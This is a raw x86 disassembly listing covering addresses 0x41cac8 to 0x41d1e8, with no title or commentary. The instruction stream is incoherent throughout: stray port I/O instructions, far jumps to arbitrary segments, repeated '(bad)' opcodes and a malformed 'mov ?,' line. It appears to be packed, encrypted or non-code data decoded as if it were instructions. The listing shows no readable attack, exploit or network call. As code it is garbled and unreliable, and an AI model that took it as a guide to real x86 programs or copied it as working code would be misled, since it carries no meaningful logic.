  41cac8:	cmp    eax,DWORD PTR es:[edx+esi*4+0x22]
  41cacd:	adc    eax,0xf44b4d5c
  41cad2:	dec    edx
  41cad3:	imul   ecx,DWORD PTR [ebx+0x35e098c7],0x3f
  41cada:	push   edi
  41cadb:	or     eax,0xf6d72a3
  41cae0:	jns    0x41cb4b
  41cae2:	mov    DWORD PTR [eax],esp
  41cae4:	add    cl,0xae
  41cae7:	jge    0x41cb05
  41cae9:	mov    ecx,0x524b367e
  41caee:	aaa    
  41caef:	in     eax,dx
  41caf0:	inc    ebp
  41caf1:	dec    edi
  41caf2:	cwde   
  41caf3:	mov    ebx,edi
  41caf5:	dec    edi
  41caf6:	mov    ah,0x15
  41caf8:	test   eax,0x2019a3c9
  41cafd:	lock addr16 mov ds:0x1f52,eax
  41cb02:	push   cs
  41cb03:	test   DWORD PTR [ecx-0x271e7cab],esi
  41cb09:	and    edi,DWORD PTR ds:0xc0e7a47e
  41cb0f:	loop   0x41cb6f
  41cb11:	dec    ecx
  41cb12:	repz sbb DWORD PTR [ecx-0x11bc131a],ecx
  41cb19:	cs fld st(6)
  41cb1c:	pop    esi
  41cb1d:	push   ecx
  41cb1e:	jne    0x41caaf
  41cb20:	adc    al,0xad
  41cb22:	ret    0x62d0
  41cb25:	fwait
  41cb26:	mov    dh,0xbb
  41cb28:	out    dx,eax
  41cb29:	aad    0x5e
  41cb2b:	jne    0x41cab0
  41cb2d:	xchg   esp,eax
  41cb2e:	(bad)  
  41cb2f:	xchg   ebx,eax
  41cb30:	dec    edi
  41cb31:	or     al,0x3c
  41cb33:	movups XMMWORD PTR [esi-0x2e87fb9a],xmm6
  41cb3a:	scas   eax,DWORD PTR es:[edi]
  41cb3b:	xchg   esp,eax
  41cb3c:	and    DWORD PTR [ebx+edi*1-0x1fd48e22],ecx
  41cb43:	outs   dx,BYTE PTR ds:[esi]
  41cb44:	fild   QWORD PTR [edi-0x73d39263]
  41cb4a:	push   ebp
  41cb4b:	imul   edx,DWORD PTR [edx-0x3f],0x57
  41cb4f:	sub    al,0xc3
  41cb51:	xchg   esp,eax
  41cb52:	test   bl,0x3c
  41cb55:	mov    al,ds:0x4b42cdcb
  41cb5a:	fsubp  st(0),st
  41cb5c:	bound  esi,QWORD PTR [eax-0x37465731]
  41cb62:	and    DWORD PTR [ecx-0x76],edi
  41cb65:	fadd   st,st(7)
  41cb67:	mov    bl,0xed
  41cb69:	sar    DWORD PTR [eax],0xe7
  41cb6c:	mov    eax,ds:0xe168b81d
  41cb71:	mov    dl,0x37
  41cb73:	dec    esp
  41cb74:	loope  0x41cb30
  41cb76:	and    al,0x8c
  41cb78:	lods   eax,DWORD PTR ds:[esi]
  41cb79:	and    eax,0x7eb72079
  41cb7e:	ss rol bl,0xaf
  41cb82:	outs   dx,BYTE PTR ds:[esi]
  41cb83:	add    al,0x65
  41cb85:	mov    dh,0x30
  41cb87:	in     al,0xc7
  41cb89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb8a:	mov    bl,0x99
  41cb8c:	cmp    DWORD PTR [ebp+0x2e85f8d8],edi
  41cb92:	repz dec esi
  41cb94:	cmc    
  41cb95:	push   edi
  41cb96:	iret   
  41cb97:	dec    ebp
  41cb98:	scas   eax,DWORD PTR es:[edi]
  41cb99:	ror    BYTE PTR [esp+edi*2+0x39],cl
  41cb9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb9e:	outs   dx,DWORD PTR ds:[esi]
  41cb9f:	cmp    ebx,DWORD PTR [ecx+ecx*4+0x6]
  41cba3:	int    0x68
  41cba5:	or     DWORD PTR [edx],esp
  41cba7:	add    eax,0x48f31d7d
  41cbac:	cmp    DWORD PTR [eax-0x56ab1607],edi
  41cbb2:	repz clc 
  41cbb4:	push   ecx
  41cbb5:	shl    edi,cl
  41cbb7:	mov    esi,0x14a98a6d
  41cbbc:	sub    eax,0xdb177078
  41cbc1:	out    0x91,eax
  41cbc3:	or     al,0x43
  41cbc5:	ja     0x41cc08
  41cbc7:	adc    al,0x8c
  41cbc9:	push   0x11
  41cbcb:	ficomp DWORD PTR [ebx]
  41cbcd:	mov    esi,0xd6ee37a2
  41cbd2:	ds jne 0x41cbee
  41cbd5:	pop    esp
  41cbd6:	jmp    0x72f0:0xed56a445
  41cbdd:	jno    0x41cbe8
  41cbdf:	loopne 0x41cc51
  41cbe1:	mov    ah,bl
  41cbe3:	ret    0x9c50
  41cbe6:	adc    eax,0xb0173503
  41cbeb:	pusha  
  41cbec:	adc    ch,0xa8
  41cbef:	test   ecx,ebp
  41cbf1:	sbb    bl,BYTE PTR [edx+edx*2]
  41cbf4:	pop    esi
  41cbf5:	cmp    dl,bl
  41cbf7:	mov    ch,0x5d
  41cbf9:	fild   QWORD PTR [ecx-0x47]
  41cbfc:	xor    ebp,DWORD PTR [edi]
  41cbfe:	pop    ebx
  41cbff:	jle    0x41cc7b
  41cc01:	push   ds
  41cc02:	out    0xad,al
  41cc04:	adc    eax,0x82f7f430
  41cc09:	sbb    eax,ecx
  41cc0b:	inc    eax
  41cc0c:	adc    eax,0x3d3c454e
  41cc11:	jnp    0x41cc69
  41cc13:	int3   
  41cc14:	fs pop edx
  41cc16:	ret    
  41cc17:	pusha  
  41cc18:	cmp    eax,0xab4da903
  41cc1d:	adc    ah,BYTE PTR [esi-0x48d36750]
  41cc23:	pop    esp
  41cc24:	xchg   DWORD PTR [edx+0x69293112],ebp
  41cc2a:	adc    DWORD PTR [eax-0x9],0xffffffb3
  41cc2e:	nop
  41cc2f:	xchg   ebp,eax
  41cc30:	lods   eax,DWORD PTR ds:[esi]
  41cc31:	xor    eax,ebx
  41cc33:	ret    
  41cc34:	pop    ss
  41cc35:	leave  
  41cc36:	pop    esp
  41cc37:	in     al,0xf7
  41cc39:	push   eax
  41cc3a:	mov    eax,0xc7c8de21
  41cc3f:	icebp  
  41cc40:	out    dx,eax
  41cc41:	cwde   
  41cc42:	pop    ss
  41cc43:	aad    0x5b
  41cc45:	lahf   
  41cc46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc47:	mov    ebp,0xd1a250cb
  41cc4c:	je     0x41ccc5
  41cc4e:	pop    esp
  41cc4f:	cli    
  41cc50:	les    esp,FWORD PTR [edi]
  41cc52:	mov    dh,0x81
  41cc54:	fcomi  st,st(2)
  41cc56:	lods   eax,DWORD PTR ds:[esi]
  41cc57:	lahf   
  41cc58:	mov    eax,ds:0xe44e72ed
  41cc5d:	pop    edx
  41cc5e:	push   ds
  41cc5f:	clc    
  41cc60:	int3   
  41cc61:	loop   0x41cc2d
  41cc63:	leave  
  41cc64:	test   DWORD PTR [edi],ebp
  41cc66:	popa   
  41cc67:	pop    edx
  41cc68:	xchg   DWORD PTR [ecx+0x54],ebx
  41cc6b:	pushf  
  41cc6c:	mov    edx,0xf942b18c
  41cc71:	test   DWORD PTR [ebx+0xb],ebx
  41cc74:	pop    eax
  41cc75:	loope  0x41cc51
  41cc77:	and    DWORD PTR [ebp-0x40],0xdd0f3320
  41cc7e:	out    dx,al
  41cc7f:	pop    ss
  41cc80:	outs   dx,BYTE PTR ds:[esi]
  41cc81:	jmp    0x3e2e980e
  41cc86:	or     DWORD PTR [eax+eax*2+0x52],0x9192c68a
  41cc8e:	sbb    DWORD PTR [edi+0x3c],0xed78ab98
  41cc95:	inc    ecx
  41cc96:	lods   al,BYTE PTR ds:[esi]
  41cc97:	jp     0x41cc76
  41cc99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc9a:	or     eax,0x9ac298a3
  41cc9f:	adc    al,0x4b
  41cca1:	fucomi st,st(5)
  41cca3:	(bad)  
  41cca4:	push   ebp
  41cca5:	cld    
  41cca6:	popa   
  41cca7:	stos   DWORD PTR es:[edi],eax
  41cca8:	pop    es
  41cca9:	test   al,0x1b
  41ccab:	xor    eax,0x1b32cfd4
  41ccb0:	adc    eax,0xaaec4c9
  41ccb5:	leave  
  41ccb6:	ja     0x41ccab
  41ccb8:	sbb    edx,DWORD PTR [ebx-0x76]
  41ccbb:	sbb    bl,bh
  41ccbd:	sbb    al,0x1d
  41ccbf:	stos   BYTE PTR es:[edi],al
  41ccc0:	imul   esi,DWORD PTR [edx-0x3849e9a0],0xec6115d6
  41ccca:	xchg   DWORD PTR [edx],edx
  41cccc:	or     BYTE PTR [edx-0x27],bl
  41cccf:	out    dx,eax
  41ccd0:	(bad)  
  41ccd1:	ds adc al,0xdf
  41ccd4:	xchg   DWORD PTR [ebp-0x3f3267dd],esp
  41ccda:	xchg   esp,eax
  41ccdb:	scas   eax,DWORD PTR es:[edi]
  41ccdc:	aam    0xac
  41ccde:	jl     0x41cd07
  41cce0:	add    ah,BYTE PTR [esi+eax*8]
  41cce3:	fs retf 0x84af
  41cce7:	enter  0x86f7,0xb
  41cceb:	inc    edx
  41ccec:	inc    edx
  41cced:	test   DWORD PTR [eax+0xc],edi
  41ccf0:	cmc    
  41ccf1:	lea    eax,[esi*1+0x680655a5]
  41ccf8:	call   0xf044:0xa37c33db
  41ccff:	sbb    esi,DWORD PTR [edx+0x75fdf6d1]
  41cd05:	stos   BYTE PTR es:[edi],al
  41cd06:	pop    eax
  41cd07:	sub    al,0xda
  41cd09:	adc    ah,bh
  41cd0b:	pop    edx
  41cd0c:	pop    ds
  41cd0d:	sahf   
  41cd0e:	mov    eax,0x7837034f
  41cd13:	mov    bh,0x48
  41cd15:	add    al,dl
  41cd17:	sbb    dh,BYTE PTR [esi]
  41cd19:	popf   
  41cd1a:	xchg   ebp,eax
  41cd1b:	push   edi
  41cd1c:	ins    DWORD PTR es:[edi],dx
  41cd1d:	push   es
  41cd1e:	adc    BYTE PTR [ecx],dh
  41cd20:	shl    esi,cl
  41cd22:	or     DWORD PTR [ecx],ebp
  41cd24:	adc    bh,cl
  41cd26:	jo     0x41cda7
  41cd28:	jge    0x41cd6c
  41cd2a:	mov    edx,0xe7572a9e
  41cd2f:	or     DWORD PTR [eax],eax
  41cd31:	mov    al,0x92
  41cd33:	cmp    DWORD PTR [edx-0x6d76e470],0x19cc9fef
  41cd3d:	ins    DWORD PTR es:[edi],dx
  41cd3e:	xchg   ebp,eax
  41cd3f:	fs fdiv st(1),st
  41cd42:	adc    DWORD PTR [esi+0x71],ebp
  41cd45:	jmp    0xc1d0255c
  41cd4a:	and    BYTE PTR [edi],al
  41cd4c:	(bad)  
  41cd4d:	das    
  41cd4e:	cwde   
  41cd4f:	ins    DWORD PTR es:[edi],dx
  41cd50:	outs   dx,BYTE PTR ds:[esi]
  41cd51:	scas   al,BYTE PTR es:[edi]
  41cd52:	leave  
  41cd53:	rcr    esp,1
  41cd55:	out    dx,al
  41cd56:	jbe    0x41cd38
  41cd58:	jbe    0x41cd0d
  41cd5a:	inc    esi
  41cd5b:	jle    0x41ccff
  41cd5d:	cmc    
  41cd5e:	ds push ds
  41cd60:	jb     0x41cdba
  41cd62:	jb     0x41cd1e
  41cd64:	xor    eax,0xdb897d17
  41cd69:	shl    bl,0x5
  41cd6c:	fs mov cx,0x45e0
  41cd71:	xlat   BYTE PTR ds:[ebx]
  41cd72:	mov    al,ds:0x1b28a762
  41cd77:	adc    ebp,DWORD PTR [ecx+ecx*8+0x508cfae4]
  41cd7e:	outs   dx,DWORD PTR ds:[esi]
  41cd7f:	mov    esp,0x9431e646
  41cd84:	inc    edx
  41cd85:	pop    eax
  41cd86:	in     eax,dx
  41cd87:	dec    edi
  41cd88:	js     0x41cde5
  41cd8a:	je     0x41cd2e
  41cd8c:	ret    
  41cd8d:	push   ecx
  41cd8e:	mov    DWORD PTR [edx+0x2c],edi
  41cd91:	retf   
  41cd92:	mov    ss,WORD PTR [esi+0x55]
  41cd95:	not    DWORD PTR [edx-0x4a2ae50f]
  41cd9b:	jbe    0x41cda2
  41cd9d:	leave  
  41cd9e:	ins    BYTE PTR es:[edi],dx
  41cd9f:	mov    BYTE PTR [ecx-0x686aedc2],cl
  41cda5:	cmp    dh,BYTE PTR [edi]
  41cda7:	mov    esi,0x6868f178
  41cdac:	sub    cl,cl
  41cdae:	mov    bl,0x5c
  41cdb0:	fs xchg ebp,eax
  41cdb2:	rcl    DWORD PTR [ecx-0x542d291],cl
  41cdb8:	(bad)  
  41cdba:	xchg   ebx,eax
  41cdbb:	bound  ebp,QWORD PTR [edi]
  41cdbd:	pop    ecx
  41cdbe:	(bad)  
  41cdbf:	jle    0x41cd71
  41cdc1:	fadd   QWORD PTR [edi-0x54]
  41cdc4:	xor    eax,0x5ce5fa5e
  41cdc9:	test   DWORD PTR [ebx-0x2c2ff4a6],0xb7a9bbe6
  41cdd3:	into   
  41cdd4:	enter  0x69ff,0x6b
  41cdd8:	pop    ss
  41cdd9:	repz inc ebx
  41cddb:	sub    al,0x48
  41cddd:	out    dx,al
  41cdde:	aas    
  41cddf:	xchg   BYTE PTR [edi],bl
  41cde1:	int3   
  41cde2:	scas   al,BYTE PTR es:[edi]
  41cde3:	or     BYTE PTR [eax],dh
  41cde5:	jne    0x41cdaa
  41cde7:	adc    DWORD PTR [eax+eax*2-0x56],ecx
  41cdeb:	xor    bl,BYTE PTR [esi+0x50ad8d4c]
  41cdf1:	and    ecx,DWORD PTR ds:0x32c776b
  41cdf7:	rcl    DWORD PTR [edx-0x2],1
  41cdfa:	mov    DWORD PTR [ecx+eax*4],0x5bf25f49
  41ce01:	push   ds
  41ce02:	add    DWORD PTR [edi+0x44],ebx
  41ce05:	enter  0x4300,0x5b
  41ce09:	cmc    
  41ce0a:	in     al,0x5e
  41ce0c:	shl    BYTE PTR cs:[ebp+0x49ae6d08],cl
  41ce13:	(bad)  
  41ce14:	xchg   edx,eax
  41ce15:	sbb    ebx,esp
  41ce17:	loope  0x41ce0a
  41ce19:	mov    BYTE PTR [eax],cl
  41ce1b:	ror    BYTE PTR [ebp+0x2cb1fdfc],cl
  41ce21:	es out 0x83,al
  41ce24:	mov    ecx,0xf5c2d3bc
  41ce29:	sti    
  41ce2a:	ds inc edx
  41ce2c:	dec    eax
  41ce2d:	das    
  41ce2e:	dec    ecx
  41ce2f:	dec    eax
  41ce30:	xchg   ebp,eax
  41ce31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce32:	and    al,0x47
  41ce34:	or     DWORD PTR [ecx],0x4
  41ce37:	mov    al,ds:0x9fef5b5f
  41ce3c:	mov    ebx,0xc89f9cc1
  41ce41:	jo     0x41cea6
  41ce43:	loope  0x41ceba
  41ce45:	sbb    BYTE PTR [edi+ebx*2+0x20a3e507],bl
  41ce4c:	xchg   DWORD PTR [ecx-0x39],edi
  41ce4f:	and    BYTE PTR [edx-0x4],ah
  41ce52:	repnz cli 
  41ce54:	and    BYTE PTR [edi+0x6a],al
  41ce57:	jl     0x41ce85
  41ce59:	pop    edi
  41ce5a:	add    DWORD PTR [edi+0x41],esi
  41ce5d:	mov    edx,0x2e73d30d
  41ce62:	out    dx,eax
  41ce63:	cmp    esp,DWORD PTR [ebp-0x2d]
  41ce66:	adc    al,0xc3
  41ce68:	fldenv [ebx]
  41ce6a:	int    0x7e
  41ce6c:	mov    eax,0xa3d0234d
  41ce71:	call   0x82e4:0xad9a0131
  41ce78:	mov    ecx,0x1093fd10
  41ce7d:	push   ebx
  41ce7e:	inc    ebp
  41ce7f:	mov    al,0x7c
  41ce81:	dec    esp
  41ce82:	jnp    0x41ce4e
  41ce84:	(bad)  [esi+0x4d]
  41ce87:	pop    esp
  41ce88:	mov    WORD PTR [ebx+0x1a47b806],gs
  41ce8e:	xor    al,0x66
  41ce90:	sar    cl,cl
  41ce92:	mov    dl,0x88
  41ce94:	cmp    BYTE PTR [ecx+0x514b1257],0x7e
  41ce9b:	xor    DWORD PTR [ebp+0x54],edx
  41ce9e:	and    ebx,DWORD PTR [esi-0x519a6b5d]
  41cea4:	mov    esp,0x51cc3383
  41cea9:	in     eax,0xdb
  41ceab:	jbe    0x41cf23
  41cead:	pop    esp
  41ceae:	inc    eax
  41ceaf:	sbb    DWORD PTR [edi-0x277af10b],esp
  41ceb5:	imul   ebp,edi,0x4145fce9
  41cebb:	sahf   
  41cebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cebd:	and    al,0xe5
  41cebf:	fldenv [edi+ebx*2-0x7603bd2d]
  41cec6:	inc    ecx
  41cec7:	scas   eax,DWORD PTR es:[edi]
  41cec8:	idiv   BYTE PTR [eax+0x33]
  41cecb:	and    eax,0x5b96dac1
  41ced0:	ss inc esp
  41ced2:	and    esi,DWORD PTR [esi-0x5e587f09]
  41ced8:	fidivr DWORD PTR [edi+edx*8]
  41cedb:	dec    ecx
  41cedc:	fs lahf 
  41cede:	pop    edx
  41cedf:	mov    dh,0xa2
  41cee1:	inc    ebp
  41cee2:	sbb    BYTE PTR [edx],bl
  41cee4:	clc    
  41cee5:	cmc    
  41cee6:	dec    eax
  41cee7:	popf   
  41cee8:	ss cmc 
  41ceea:	sub    ebp,eax
  41ceec:	pop    edx
  41ceed:	out    dx,eax
  41ceee:	mov    edx,0x264af7c9
  41cef3:	retf   
  41cef4:	xor    al,0x78
  41cef6:	scas   al,BYTE PTR es:[edi]
  41cef7:	arpl   WORD PTR [esi+0x1b36a58c],si
  41cefd:	(bad)  
  41cefe:	jle    0x41cebc
  41cf00:	push   ecx
  41cf01:	scas   al,BYTE PTR es:[edi]
  41cf02:	mov    eax,ds:0xe14eec47
  41cf07:	or     eax,DWORD PTR [ebp+0x3cba45c8]
  41cf0d:	sub    DWORD PTR [ecx+0x15abcdc0],ebx
  41cf13:	xchg   esi,eax
  41cf14:	mov    al,0x86
  41cf16:	shr    DWORD PTR [ebx],0x1e
  41cf19:	add    BYTE PTR [esi],bh
  41cf1b:	call   0x742b9c6d
  41cf20:	retf   0x320e
  41cf23:	out    dx,al
  41cf24:	outs   dx,BYTE PTR ds:[esi]
  41cf25:	mov    cl,0xa6
  41cf27:	loop   0x41cf08
  41cf29:	repz fwait
  41cf2b:	out    0x81,al
  41cf2d:	pop    esi
  41cf2e:	btr    ebx,eax
  41cf31:	into   
  41cf32:	dec    esp
  41cf33:	sbb    edi,DWORD PTR [ecx+0x3d]
  41cf36:	sbb    ebp,DWORD PTR [esi-0x4f055acc]
  41cf3c:	pop    esi
  41cf3d:	pusha  
  41cf3e:	sar    BYTE PTR [eax+0xa],cl
  41cf41:	jns    0x41cfb9
  41cf43:	mov    ebx,0x1245971b
  41cf48:	push   ecx
  41cf49:	and    ecx,eax
  41cf4b:	in     al,0x83
  41cf4d:	push   cs
  41cf4e:	adc    al,0xa3
  41cf50:	in     al,dx
  41cf51:	jl     0x41cf9f
  41cf53:	inc    edx
  41cf54:	mov    ebp,0x95a408eb
  41cf59:	add    DWORD PTR [edx-0x48],edx
  41cf5c:	sbb    BYTE PTR [ecx+ebp*1],dh
  41cf5f:	inc    esp
  41cf60:	aad    0xc
  41cf62:	je     0x41cfd9
  41cf64:	mov    edx,0x5e96d194
  41cf69:	iret   
  41cf6a:	test   al,0x56
  41cf6c:	lods   al,BYTE PTR ds:[esi]
  41cf6d:	leave  
  41cf6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf6f:	leave  
  41cf70:	inc    edx
  41cf71:	loope  0x41cf0f
  41cf73:	call   0x7b0d:0x44e3f23f
  41cf7a:	mov    esp,DWORD PTR [eax+0x68]
  41cf7d:	xchg   edi,eax
  41cf7e:	or     al,0xe1
  41cf80:	mov    dh,0xb0
  41cf82:	xchg   BYTE PTR [edi],cl
  41cf84:	xor    al,0xca
  41cf86:	xor    DWORD PTR [edi-0x31e10e10],ecx
  41cf8c:	mov    bh,0x50
  41cf8e:	test   BYTE PTR [ebx-0x28bbaa0c],ch
  41cf94:	inc    ebp
  41cf95:	xor    ch,cl
  41cf97:	cmp    esp,DWORD PTR [eax-0x74]
  41cf9a:	(bad)
  41cf9f:	scas   al,BYTE PTR es:[edi]
  41cfa0:	iret   
  41cfa1:	inc    edx
  41cfa2:	or     dl,ch
  41cfa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfa5:	cmp    al,0x8b
  41cfa7:	push   ebx
  41cfa8:	retf   0x1325
  41cfab:	test   cl,0xe7
  41cfae:	inc    esi
  41cfaf:	xchg   DWORD PTR [esi-0x28],ecx
  41cfb2:	pop    edx
  41cfb3:	inc    edi
  41cfb4:	xchg   ebx,eax
  41cfb5:	push   ds
  41cfb6:	xor    bh,BYTE PTR [esi-0x33]
  41cfb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfba:	lahf   
  41cfbb:	mov    fs,edx
  41cfbd:	lea    ebx,[ecx+0x78d1aa82]
  41cfc3:	fild   WORD PTR [edx+0x38]
  41cfc6:	and    al,0x2d
  41cfc8:	mov    ebx,0xa86f7110
  41cfcd:	pop    edx
  41cfce:	shl    DWORD PTR [edx-0x585a18f5],cl
  41cfd4:	add    dl,BYTE PTR [ebx-0x6d]
  41cfd7:	jl     0x41cfcc
  41cfd9:	mov    al,ds:0xbc6e0247
  41cfde:	and    eax,0xf8423250
  41cfe3:	scas   eax,DWORD PTR es:[edi]
  41cfe4:	shl    BYTE PTR [eax+0x9],0x75
  41cfe8:	repz je 0x41d010
  41cfeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfec:	push   ss
  41cfed:	imul   ebp,DWORD PTR [esi],0xffffff93
  41cff0:	fcmovu st,st(6)
  41cff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cff3:	xor    ebp,DWORD PTR [ecx+0x39]
  41cff6:	add    edx,DWORD PTR [ebx-0x2930cce0]
  41cffc:	push   0x32a6fb0e
  41d001:	mov    bl,BYTE PTR [ebx-0x297b53fa]
  41d007:	lds    edx,FWORD PTR ss:[eax+0x1fe4e1c]
  41d00e:	push   esp
  41d00f:	dec    eax
  41d010:	or     eax,0x29f3f9bd
  41d015:	mov    bl,0x13
  41d017:	adc    dh,bl
  41d019:	pop    esi
  41d01a:	or     DWORD PTR [edi-0x7cdefd0b],edi
  41d020:	loopne 0x41cfdd
  41d022:	sub    DWORD PTR [edi],esp
  41d024:	xchg   ebp,eax
  41d025:	pop    edi
  41d026:	mov    ebp,DWORD PTR [edx+0x73814ec6]
  41d02c:	(bad)  [esp+edx*1]
  41d02f:	das    
  41d030:	dec    edi
  41d031:	ret    0x77a9
  41d034:	or     eax,0xb95e3ec
  41d039:	jb     0x41cfbc
  41d03b:	cmp    DWORD PTR [esp+edx*2-0x37],edx
  41d03f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d040:	les    edx,FWORD PTR [edx]
  41d042:	xor    ebx,DWORD PTR [eax]
  41d044:	in     al,0x62
  41d046:	retf   0xede5
  41d049:	xchg   DWORD PTR [ebx+edx*4+0x6e],ebx
  41d04d:	cli    
  41d04e:	dec    ecx
  41d04f:	sbb    bl,BYTE PTR [esi]
  41d051:	xor    ebp,DWORD PTR [esi+ebp*1]
  41d054:	popf   
  41d055:	jns    0x41d0c6
  41d057:	xor    DWORD PTR [ecx+0x2b],edi
  41d05a:	leave  
  41d05b:	jp     0x41d0c8
  41d05d:	sbb    al,0x5d
  41d05f:	mov    bh,0x7a
  41d061:	jo     0x41d07a
  41d063:	and    ah,0x68
  41d066:	sub    bh,BYTE PTR [esi]
  41d068:	ins    DWORD PTR es:[edi],dx
  41d069:	jle    0x41d0c3
  41d06b:	sub    al,0x95
  41d06d:	xor    dl,BYTE PTR [edi+0x79]
  41d070:	mov    WORD PTR [edi+ebp*4-0x6615f787],ds
  41d077:	inc    esp
  41d078:	cmp    edx,ecx
  41d07a:	mov    edx,0xd4a2d811
  41d07f:	pop    edi
  41d080:	sahf   
  41d081:	stos   DWORD PTR es:[edi],eax
  41d082:	psllw  mm3,QWORD PTR [ebp-0x4f]
  41d086:	cmp    eax,DWORD PTR [edx]
  41d088:	mov    eax,0x698b9d74
  41d08d:	add    DWORD PTR [edx],0x58cb633e
  41d093:	mov    edi,esp
  41d095:	pop    ecx
  41d096:	ficomp DWORD PTR [esi+edx*2+0x7b4279db]
  41d09d:	pop    es
  41d09e:	js     0x41d054
  41d0a0:	dec    ebx
  41d0a1:	or     edi,DWORD PTR [ecx+0xe]
  41d0a4:	pushf  
  41d0a5:	pusha  
  41d0a6:	add    esi,DWORD PTR [eax]
  41d0a8:	mov    esp,0xa6c28738
  41d0ad:	or     al,0x2
  41d0af:	es push ss
  41d0b1:	sub    ecx,ecx
  41d0b3:	pop    ecx
  41d0b4:	(bad)  
  41d0b5:	fdivr  DWORD PTR [ebx]
  41d0b7:	pushf  
  41d0b8:	cmc    
  41d0b9:	pop    ss
  41d0ba:	pop    ss
  41d0bb:	iret   
  41d0bc:	mov    ds:0x3f7b1c7e,eax
  41d0c1:	leave  
  41d0c2:	or     BYTE PTR [eax+ecx*4-0x1f],dh
  41d0c6:	mov    bl,0x93
  41d0c8:	sub    cl,0x74
  41d0cb:	in     eax,0xd4
  41d0cd:	or     ebx,edi
  41d0cf:	sub    edi,ebx
  41d0d1:	adc    eax,0x47e3122a
  41d0d6:	ins    DWORD PTR es:[edi],dx
  41d0d7:	cwde   
  41d0d8:	popf   
  41d0d9:	adc    al,0x59
  41d0db:	(bad)  
  41d0dc:	imul   esp,DWORD PTR ds:0x3f296456,0x724cb0ae
  41d0e6:	mov    dl,0x5f
  41d0e8:	shr    DWORD PTR [ecx+0x56],1
  41d0eb:	mov    edx,0x6c9ce16d
  41d0f0:	dec    ebp
  41d0f1:	jb     0x41d13e
  41d0f3:	dec    BYTE PTR [edi+edx*8+0x52f52b05]
  41d0fa:	push   ss
  41d0fb:	lahf   
  41d0fc:	dec    esp
  41d0fd:	pop    eax
  41d0fe:	xor    al,0xa5
  41d100:	sahf   
  41d101:	cmp    DWORD PTR [eax],0xf901acd9
  41d107:	push   ebx
  41d108:	mov    al,0xba
  41d10a:	(bad)  
  41d10b:	fcomp  QWORD PTR [ebx+0x46]
  41d10e:	dec    DWORD PTR [edx-0x23]
  41d111:	pusha  
  41d112:	mov    eax,ebp
  41d114:	mov    ?,WORD PTR [ecx+edx*1]
  41d117:	scas   al,BYTE PTR es:[edi]
  41d118:	dec    edi
  41d119:	mov    esi,edx
  41d11b:	pop    ecx
  41d11c:	xchg   edx,eax
  41d11d:	loop   0x41d166
  41d11f:	cmp    bh,dh
  41d121:	push   0x8da62a88
  41d126:	pop    edi
  41d127:	xchg   ebx,eax
  41d128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d129:	fmul   st,st(6)
  41d12b:	mov    bl,0x88
  41d12d:	maskmovq mm5,(bad)
  41d12e:	imul   DWORD PTR [edx+0x6a8a2a0e]
  41d134:	cmp    ebx,edx
  41d136:	cmp    al,0x22
  41d138:	mov    bl,0x25
  41d13a:	ins    BYTE PTR es:[edi],dx
  41d13b:	jp     0x41d18b
  41d13d:	test   BYTE PTR [edx+0x419c8755],cl
  41d143:	je     0x41d18a
  41d145:	pop    ss
  41d146:	ds enter 0x2f6e,0x21
  41d14b:	popf   
  41d14c:	xchg   ebp,eax
  41d14d:	mov    al,ds:0xfa68d69a
  41d152:	add    BYTE PTR [ecx-0x2573dddb],0xf
  41d159:	adc    DWORD PTR [edi],esp
  41d15b:	popf   
  41d15c:	(bad)  
  41d15d:	xlat   BYTE PTR ds:[ebx]
  41d15e:	cmp    BYTE PTR [ecx],dh
  41d160:	lds    ebp,FWORD PTR [ebx-0x5ebaa020]
  41d166:	pop    esp
  41d167:	sbb    bh,BYTE PTR [ebx]
  41d169:	imul   ebx,DWORD PTR [ecx+0x40],0x8c92cd66
  41d170:	and    DWORD PTR [edx+0x22],esi
  41d173:	lock das 
  41d175:	mov    eax,ds:0xf6553795
  41d17a:	dec    edx
  41d17b:	jmp    0x41d107
  41d17d:	cmp    eax,0x6de15d27
  41d182:	jle    0x41d187
  41d184:	jmp    FWORD PTR [edi]
  41d186:	xor    dl,BYTE PTR [ecx-0x53]
  41d189:	nop
  41d18a:	nop
  41d18b:	inc    ebx
  41d18c:	push   0xffffffb8
  41d18e:	in     eax,dx
  41d18f:	dec    ebp
  41d190:	inc    eax
  41d191:	and    al,BYTE PTR [ebp-0x1fb2dcef]
  41d197:	lods   eax,DWORD PTR ds:[esi]
  41d198:	js     0x41d201
  41d19a:	stc    
  41d19b:	(bad)  
  41d19c:	(bad)  
  41d19d:	mov    ch,0xca
  41d19f:	nop    DWORD PTR [ecx-0x77c7ef4]
  41d1a6:	xor    ecx,DWORD PTR [ecx]
  41d1a8:	loope  0x41d182
  41d1aa:	into   
  41d1ab:	sbb    eax,0x787cb68f
  41d1b0:	sti    
  41d1b1:	outs   dx,BYTE PTR ds:[esi]
  41d1b2:	mov    ds,ebx
  41d1b4:	mov    eax,0x23438dc9
  41d1b9:	hlt    
  41d1ba:	add    al,0x44
  41d1bc:	popa   
  41d1bd:	out    0x71,al
  41d1bf:	retf   0xfc73
  41d1c2:	dec    edx
  41d1c3:	(bad)  
  41d1c4:	sahf   
  41d1c5:	xchg   ecx,eax
  41d1c6:	js     0x41d1d7
  41d1c8:	ror    DWORD PTR [ebx],1
  41d1ca:	push   esp
  41d1cb:	ja     0x41d1b8
  41d1cd:	dec    ecx
  41d1ce:	popf   
  41d1cf:	in     al,dx
  41d1d0:	fsubr  QWORD PTR [edi-0x40]
  41d1d3:	shl    edi,1
  41d1d5:	or     BYTE PTR [edi+edi*1-0x68],bh
  41d1d9:	popa   
  41d1da:	pop    ecx
  41d1db:	push   eax
  41d1dc:	add    eax,esi
  41d1de:	shr    DWORD PTR cs:[ebx+0x3f],0x52
  41d1e3:	sbb    eax,eax
  41d1e5:	inc    ecx
  41d1e6:	arpl   cx,dx
  41d1e8:	in     al,0xf5
